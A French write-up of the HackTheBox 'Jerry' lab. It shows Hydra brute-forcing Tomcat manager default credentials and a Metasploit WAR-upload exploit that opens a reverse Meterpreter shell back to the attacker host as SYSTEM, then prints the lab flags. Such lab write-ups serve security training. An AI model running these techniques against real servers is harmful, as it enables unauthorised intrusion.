# Solution du CTF Jerry de HackTheBox

Introduction
------------

Ce CTF a été de loin la pire expérience sur HackTheBox : un challenge ultra simple pourri par d'autres utilisateurs qui réinitialisaient les mots de passe non-stop, sans compter les reset fréquents de la machine lancés par les autres utilisateurs excédés.  

Blitzkrieg
----------

On a un Apache Tomcat/7.0.88 tournant sur le port 8080. Le système semble être un Microsoft Windows Server 2012.  

On trouve facilement [une liste de mots de passe par défaut](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown) pour l'accès au Tomcat.  

On peut bruteforcer l'accès à la section manager via le module Metasploit *scanner/http/tomcat\_mgr\_login* ou encore via Hydra en espérant que le mot de passe n'a pas été préalablement changé :  

```plain
$ hydra -P  /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt http-get://10.10.10.95:8080/manager/html
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-07-01 13:28:10
[DATA] max 16 tasks per 1 server, overall 16 tasks, 42 login tries (l:6/p:7), ~3 tries per task
[DATA] attacking http-get://10.10.10.95:8080//manager/html
[8080][http-get] host: 10.10.10.95   login: admin   password: admin
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-07-01 13:28:13
```

Dès lors on peut exploiter le Tomcat par l'upload d'un fichier WAR spécifique, ce que fait très bien Metasploit pour nous :  

```plain
msf exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.35:443
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying 8XnD7mo2yl64uHauGnpw62S1lJuMdv...
[*] Executing 8XnD7mo2yl64uHauGnpw62S1lJuMdv...
[*] Undeploying 8XnD7mo2yl64uHauGnpw62S1lJuMdv ...
[*] Sending stage (53837 bytes) to 10.10.10.95
[*] Meterpreter session 1 opened (10.10.14.35:443 -> 10.10.10.95:49192) at 2018-07-07 09:34:26 +0200

meterpreter > getuid
Server username: JERRY$
meterpreter > pwd
C:\apache-tomcat-7.0.88
meterpreter > sysinfo
Computer    : JERRY
OS          : Windows Server 2012 R2 6.3 (amd64)
Meterpreter : java/windows
meterpreter > shell
Process 1 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>

C:\Users\Administrator\Desktop\flags>whoami
whoami
nt authority\system
C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```


*Published November 17 2018 at 18:43*